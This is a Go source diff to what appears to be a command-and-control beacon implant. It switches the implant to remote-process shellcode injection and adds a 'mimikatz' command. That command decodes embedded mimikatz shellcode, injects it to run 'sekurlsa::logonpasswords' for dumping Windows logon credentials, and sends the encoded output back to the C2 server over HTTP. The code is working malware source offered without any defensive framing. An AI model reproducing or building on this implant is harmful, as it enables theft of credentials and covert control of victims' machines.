@@ -11,6 +11,7 @@ import (
 	"strings"
 	"runtime"
 	"net/http"
+	"encoding/hex"
 	"encoding/json"
     "mime/multipart"
 	b64 "encoding/base64"
@@ -78,7 +79,7 @@ func (packet BeaconHttp) handleQueryResponse(commResp CommandResponse) {
 			continue
 		}
 
-		si := ShellcodeInjector {decodedShellcode, procId}
+		si := RemoteShellcodeInjector {decodedShellcode, procId}
 		err = si.inject()
 		
 		var data []byte
@@ -124,6 +125,20 @@ func (packet BeaconHttp) handleQueryResponse(commResp CommandResponse) {
 		
 		if cmdSplit[0] == "exit" || cmdSplit[0] == "quit" {
 			packet.exitHandler()
+		}
+
+		if cmdSplit[0] == "mimikatz" {
+			data, err := hex.DecodeString(mimikatzShellcode)
+			fmt.Println(err)
+			injector := RemotePipedShellcodeInjector { 
+				shellcode: data,
+				args: "\"privilege::debug\" \"sekurlsa::logonpasswords\" exit",//strings.Join(append(cmdSplit[1:], "exit"), " "),
+			}
+
+			data, err = json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"mimikatz",[]byte(injector.inject())})
+			debugFatal(err)
+			encoded := b64.StdEncoding.EncodeToString(data)
+			queryCommandHttp(encoded)
 		}
 
 		if cmdSplit[0] == "plist" {
